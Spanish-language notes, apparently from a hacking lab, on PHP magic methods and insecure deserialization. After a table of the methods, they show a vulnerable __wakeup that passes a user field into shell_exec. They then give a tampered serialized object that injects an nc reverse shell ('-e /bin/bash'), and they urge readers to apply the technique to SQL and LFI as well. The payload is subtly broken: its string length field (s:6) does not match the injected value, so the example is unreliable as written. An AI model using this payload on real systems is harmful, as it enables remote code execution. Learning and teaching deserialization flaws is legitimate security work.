### INFO

- Php tiene un total de 17 magic methods
- Son métodos que reescriben el comportamiento de los objetos cuando son llamados
- Inician con "__"

| Método   | Desc. |
|----------|------|
| __construct    | Método constructor de una clase  |
| __toString    | Define cómo un objeto reacciona al ser trabajado como un string   |
| __call  | Usado cuando se trata de llamar un metodo inaccesible dentro del contexto de un objeto   |
| __get     | CUando tratamos de leer propiedades inaccesibles   |
| __set    | Llamado cuando tratamos de escribir propiedades inaccesibles   |
| __clone    | Cuando tratamos de clonar un objeto   |
| __destruct     | Cuando necesitamos destruir un objeto   |
| __isset    | Cuando tratamos de llamar un isset() o un isempty() en propiedades inaccessibles   |
| __invoke    | Cuando tratamos de invocar un objeto como función   |
| __sleep     | **Llamada cuando se necesita serializar un objeto**. Si __serialize y __sleep están definidas la segunda es ignorada   |
| __wakeup    | **Llamada cuando se deserializa un objeto**. Si __unserialize y __wakeup están definidas, la segunra es ignorada   |
| __unset    | Llamada cuando se tratamos de hacer un unset sobre una propiedad inaccesible   |
| __callStatic    | Llamada cuando necesitamos acceder a un metodo inaccesible en un contexto estático  |
| __set_state    | Llamado cuando var_export es llamado sobre un objeto   |
| __debuginfo    | Llamado cuando var_dump es llamado sobre un objeto   |
| __unserialize     |  Llamado cuando necesitamos un deserializar un objeto  |
| __serialize    | Llamado cuando necesitamos serializar un objeto   |


### Whitebox

Supongamos que tenemos el siguiente código que recibe un objeto serializado:

       public function __construct($Name, $Email, $Password, $ProfilePic) {
            $this->setName($Name);
            $this->setEmail($Email);
            $this->setPassword($Password);
            $this->setProfilePic($ProfilePic);
        }
    
        public function __wakeup() {
            shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
        }
    
        public function __sleep() {
            return array("Name", "Email", "Password", "ProfilePic");
        }

Vemos que la función __wakeup es utilizada para deserializar y asentar esto en un log por medio de la ejecución de código en la terminal y que invoca al atributo NAME del objeto.

Podríamos entonces modificar el value del name del objeto para crear una shell reversa y conseguir RCE:

##### Objeto serializado:

       O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"porota";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}

##### Objeto modificado con inyección de codigo:

       O:24:"App\Helpers\UserSettings":4:{s:30:"App\Helpers\UserSettingsName";s:6:"; nc -nv 127.0.0.1 9999 -e /bin/bash;#";s:31:"App\Helpers\UserSettingsEmail";s:17:"porota@porota.com";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$rhsxRw1X8gpBNhIaMVK9g.jREhfEqNWrNpIGxTpLry1nn8vp8YGXC";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}


---
#### Extra

Nos siempre el RCE va a ser posible, de igual manera depende de los magic methods usados por los desarrolladores y la inyección en un objeto serializado no se resume a comandos. Puede ser aplicados a sql, LFI y cualquier otra transacción de datos. Sean creativos.
